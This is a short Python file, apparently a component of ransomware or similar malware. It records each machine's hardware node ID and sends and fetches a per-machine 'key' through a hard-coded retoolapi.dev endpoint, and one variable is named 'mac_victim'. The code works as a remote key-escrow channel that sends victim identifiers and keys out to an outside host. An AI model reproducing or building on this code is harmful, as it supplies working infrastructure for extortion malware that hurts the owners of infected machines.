import requests
import json
import uuid

def get_node():
  return uuid.getnode()

def get_key(node):
  headers = {"Accept": "application/json"}
  url = 'https://retoolapi.dev/IkTD2z/data?node=' + str(node)
  respone = requests.get(url=url, headers=headers)
  json_respone = json.loads(respone.text)
  try:
    mac_victim = json_respone[0]['key']
  except:
    mac_victim = 'NA'
  return mac_victim

def post_key(node, key) -> int:
  headers = {"Accept": "application/json"}
  url = 'https://retoolapi.dev/IkTD2z/data' 
  data = {'node': node, 'key': key}
  respone = requests.post(url=url, headers=headers, data=data)
  return respone.status_code